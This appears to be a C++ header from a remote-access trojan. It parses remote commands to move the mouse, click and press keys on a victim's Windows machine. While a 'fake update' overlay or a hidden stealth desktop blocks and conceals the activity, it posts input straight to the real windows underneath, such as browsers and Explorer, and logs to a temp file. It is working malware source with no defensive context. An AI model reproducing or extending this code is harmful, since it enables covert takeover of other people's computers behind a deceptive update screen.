#ifndef INPUT_CONTROL_H
#define INPUT_CONTROL_H

#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <cctype>
#include "hidden_desktop.h"

// ---------------------------------------------------------------------------
// Fake-update hook bypass helpers
// ---------------------------------------------------------------------------
// When the fake update overlay is running it installs WH_MOUSE_LL and
// WH_KEYBOARD_LL hooks that swallow every SendInput call.  We bypass them by
// posting messages directly to the real window underneath, which never goes
// through the hook chain.

// Convert screen-percentage coords to absolute screen pixels.
static inline void PctToScreen(float xPct, float yPct, int& sx, int& sy) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    sx = (int)((xPct / 100.0f) * sw);
    sy = (int)((yPct / 100.0f) * sh);
}

// Find the deepest visible, enabled child window at screen point (sx,sy),
// skipping the fake-update overlay itself.
// Many apps (Chrome, Explorer, VS) have 3-5+ levels of nested child windows.
// ChildWindowFromPointEx only goes ONE level deep, so we loop until we
// can't go any deeper — that gives us the exact control under the cursor.
static inline HWND RealWindowFromPoint(int sx, int sy, HWND hSkip) {
    POINT pt = { sx, sy };
    // Walk Z-order to find the topmost top-level window (not the overlay) at this point.
    // If hSkip is NULL (stealth desktop without fake update), start from the desktop's
    // topmost window via GetTopWindow(GetDesktopWindow()).
    HWND hTop = NULL;
    HWND hStart = hSkip ? hSkip : GetTopWindow(GetDesktopWindow());
    for (HWND h = GetWindow(hStart, GW_HWNDNEXT); h != NULL; h = GetWindow(h, GW_HWNDNEXT)) {
        if (!IsWindowVisible(h)) continue;
        RECT wr;
        if (!GetWindowRect(h, &wr)) continue;
        if (PtInRect(&wr, pt)) { hTop = h; break; }
    }
    if (!hTop) return NULL;

    // Now drill into child windows as deep as possible
    HWND hCurrent = hTop;
    while (true) {
        POINT cpt = pt;
        ScreenToClient(hCurrent, &cpt);
        HWND hChild = ChildWindowFromPointEx(hCurrent, cpt,
                          CWP_SKIPINVISIBLE | CWP_SKIPDISABLED | CWP_SKIPTRANSPARENT);
        // Stop when there are no more children or we'd loop back to the same window
        if (!hChild || hChild == hCurrent) break;
        hCurrent = hChild;
    }
    return hCurrent;
}

// Post a mouse message directly to a window (bypasses LL hooks).
static inline void DirectMouseMessage(HWND hWnd, UINT msg, WPARAM wp, int sx, int sy) {
    if (!hWnd) return;
    POINT pt = { sx, sy };
    ScreenToClient(hWnd, &pt);
    PostMessage(hWnd, msg, wp, MAKELPARAM((WORD)pt.x, (WORD)pt.y));
}
// ---------------------------------------------------------------------------

// Portable case-insensitive string compare (replaces MSVC _stricmp)
inline int istricmp(const char* a, const char* b) {
    while (*a && *b) {
        int ca = toupper((unsigned char)*a);
        int cb = toupper((unsigned char)*b);
        if (ca != cb) return ca - cb;
        a++; b++;
    }
    return toupper((unsigned char)*a) - toupper((unsigned char)*b);
}

// Portable case-insensitive string compare with length limit (replaces MSVC _strnicmp)
inline int istrnicmp(const char* a, const char* b, size_t n) {
    for (size_t i = 0; i < n; i++) {
        if (a[i] == '\0' && b[i] == '\0') return 0;
        int ca = toupper((unsigned char)a[i]);
        int cb = toupper((unsigned char)b[i]);
        if (ca != cb) return ca - cb;
        if (a[i] == '\0') return 0;
    }
    return 0;
}

inline void HandleInputControl(const char* command) {
    // Detect fake-update overlay — if present, all SendInput calls are blocked
    // by its LL hooks, so we route through direct window messages instead.
    HWND hFakeUpdate = FindWindowA("FakeUpdateWindowClass", NULL);
    // Also check if we're on the stealth desktop — SendInput is blocked by
    // Windows UIPI on any desktop that isn't the active visible desktop.
    bool onStealthDesktop = (GetCurrentDesktopMode() == DESKTOP_STEALTH);
    bool hookActive  = (hFakeUpdate != NULL) || onStealthDesktop;

    if (strncmp(command, "mouse_move ", 11) == 0) {
        float x_pct = 0, y_pct = 0;
        if (sscanf(command + 11, "%f %f", &x_pct, &y_pct) == 2) {
            if (hookActive) {
                int sx, sy;
                PctToScreen(x_pct, y_pct, sx, sy);
                HWND hTarget = RealWindowFromPoint(sx, sy, hFakeUpdate);
                DirectMouseMessage(hTarget, WM_MOUSEMOVE, 0, sx, sy);
            } else {
                LONG absX = (LONG)((x_pct / 100.0f) * 65535.0f);
                LONG absY = (LONG)((y_pct / 100.0f) * 65535.0f);
                INPUT input = {0};
                input.type = INPUT_MOUSE;
                input.mi.dx = absX;
                input.mi.dy = absY;
                input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
                SendInput(1, &input, sizeof(INPUT));
            }
        }
    } else if (strncmp(command, "mouse_click ", 12) == 0) {
        char btn[16], state[16];
        float x_pct = 0, y_pct = 0;
        int parsed = sscanf(command + 12, "%15s %15s %f %f", btn, state, &x_pct, &y_pct);
        // Inline debug log — appends to same wud.log used by main.cpp
        {
            char tmp[MAX_PATH]; GetTempPathA(MAX_PATH, tmp); strcat(tmp, "wud.log");
            FILE* f = fopen(tmp, "a");
            if (f) {
                fprintf(f, "CLICK: parsed=%d hookActive=%d btn=%s state=%s x=%.2f y=%.2f\n",
                        parsed, (int)hookActive, parsed>=1?btn:"?", parsed>=2?state:"?", x_pct, y_pct);
                fflush(f); fclose(f);
            }
        }
        if (parsed == 4) {
            std::cout << "[MOUSE] Click " << btn << " " << state << " at " << x_pct << "%, " << y_pct << "%\n";

            if (hookActive) {
                // Bypass LL hook — post directly to the real window under the point.
                int sx, sy;
                PctToScreen(x_pct, y_pct, sx, sy);
                HWND hTarget = RealWindowFromPoint(sx, sy, hFakeUpdate);

                bool isDown = (istricmp(state, "down") == 0);

                // On mouse-DOWN: wake the target window before the click.
                // Many apps (browsers, file explorer, etc.) silently discard
                // WM_LBUTTONDOWN if they don't have focus/activation first.
                // We mimic what Windows does naturally when a user clicks:
                //   1. WM_MOUSEACTIVATE  — tells the window it's being activated by a click
                //   2. WM_ACTIVATE       — foreground activation
                //   3. WM_SETFOCUS       — keyboard focus follows
                if (isDown && hTarget) {
                    HWND hRoot = GetAncestor(hTarget, GA_ROOT);
                    UINT hitCode = HTCLIENT;
                    UINT clickMsg = (istricmp(btn, "right") == 0) ? WM_RBUTTONDOWN : WM_LBUTTONDOWN;
                    PostMessage(hTarget, WM_MOUSEACTIVATE,
                                (WPARAM)(hRoot ? hRoot : hTarget),
                                MAKELPARAM((WORD)hitCode, (WORD)clickMsg));
                    PostMessage(hRoot ? hRoot : hTarget, WM_ACTIVATE,
                                MAKEWPARAM(WA_CLICKACTIVE, 0), 0);
                    PostMessage(hTarget, WM_SETFOCUS, 0, 0);
                }

                if (istricmp(btn, "left") == 0) {
                    UINT msg  = isDown ? WM_LBUTTONDOWN : WM_LBUTTONUP;
                    WPARAM wp = isDown ? MK_LBUTTON      : 0;
                    DirectMouseMessage(hTarget, msg, wp, sx, sy);
                } else if (istricmp(btn, "right") == 0) {
                    UINT msg  = isDown ? WM_RBUTTONDOWN : WM_RBUTTONUP;
                    WPARAM wp = isDown ? MK_RBUTTON      : 0;
                    DirectMouseMessage(hTarget, msg, wp, sx, sy);
                }
            } else {
                LONG absX = (LONG)((x_pct / 100.0f) * 65535.0f);
                LONG absY = (LONG)((y_pct / 100.0f) * 65535.0f);
                DWORD flag = 0;
                if (istricmp(btn, "left") == 0) {
                    flag = (istricmp(state, "down") == 0) ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
                } else if (istricmp(btn, "right") == 0) {
                    flag = (istricmp(state, "down") == 0) ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP;
                }
                if (flag) {
                    // Before injecting a down-click, bring the window under the
                    // cursor to the foreground so Windows doesn't eat the first
                    // click as a "focus activation" (MA_ACTIVATE behavior).
                    bool isDown = (flag == MOUSEEVENTF_LEFTDOWN || flag == MOUSEEVENTF_RIGHTDOWN);
                    if (isDown) {
                        int sx = (int)((x_pct / 100.0f) * GetSystemMetrics(SM_CXSCREEN));
                        int sy = (int)((y_pct / 100.0f) * GetSystemMetrics(SM_CYSCREEN));
                        POINT pt = { sx, sy };
                        HWND hWin = WindowFromPoint(pt);
                        if (hWin) {
                            HWND hRoot = GetAncestor(hWin, GA_ROOT);
                            if (hRoot) {
                                // AllowSetForegroundWindow lets us call SetForegroundWindow
                                // even though our process isn't the current foreground owner.
                                AllowSetForegroundWindow(ASFW_ANY);
                                SetForegroundWindow(hRoot);
                            }
                        }
                    }

                    INPUT inputs[2] = {0};
                    inputs[0].type = INPUT_MOUSE;
                    inputs[0].mi.dx = absX;
                    inputs[0].mi.dy = absY;
                    inputs[0].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
                    inputs[1].type = INPUT_MOUSE;
                    inputs[1].mi.dx = absX;
                    inputs[1].mi.dy = absY;
                    inputs[1].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | flag;
                    UINT sent = SendInput(2, inputs, sizeof(INPUT));
                    DWORD err = GetLastError();
                    char tmp[MAX_PATH]; GetTempPathA(MAX_PATH, tmp); strcat(tmp, "wud.log");
                    FILE* f = fopen(tmp, "a");
                    if (f) { fprintf(f, "SENDINPUT: sent=%u absX=%ld absY=%ld flag=0x%lx err=%lu\n", sent, absX, absY, (unsigned long)flag, (unsigned long)err); fflush(f); fclose(f); }
                }
            }
        }
    } else if (strncmp(command, "key_press ", 10) == 0) {
        int vkCode;
        char state[16];
        if (sscanf(command + 10, "%d %15s", &vkCode, state) == 2) {
            std::cout << "[KEYBOARD] Key " << vkCode << " " << state << "\n";
            if (hookActive) {
                // Keyboard LL hook is also active — post WM_KEYDOWN/UP directly
                // to the first visible real window below the overlay.
                // On stealth desktop (hFakeUpdate == NULL), enumerate from desktop top.
                HWND hStart = hFakeUpdate ? hFakeUpdate : GetTopWindow(GetDesktopWindow());
                HWND hTarget = GetWindow(hStart, GW_HWNDNEXT);
                while (hTarget && !IsWindowVisible(hTarget))
                    hTarget = GetWindow(hTarget, GW_HWNDNEXT);
                if (hTarget) {
                    UINT msg = (istricmp(state, "down") == 0) ? WM_KEYDOWN : WM_KEYUP;
                    LPARAM lp = (msg == WM_KEYUP)
                        ? (LPARAM)(0xC0000001 | (MapVirtualKey(vkCode, MAPVK_VK_TO_VSC) << 16))
                        : (LPARAM)(0x00000001 | (MapVirtualKey(vkCode, MAPVK_VK_TO_VSC) << 16));
                    PostMessage(hTarget, msg, (WPARAM)vkCode, lp);
                }
            } else {
                INPUT input = {0};
                input.type = INPUT_KEYBOARD;
                input.ki.wVk = (WORD)vkCode;
                input.ki.dwFlags = (istricmp(state, "down") == 0) ? 0 : KEYEVENTF_KEYUP;
                SendInput(1, &input, sizeof(INPUT));
            }
        }
    }
}

#endif // INPUT_CONTROL_H
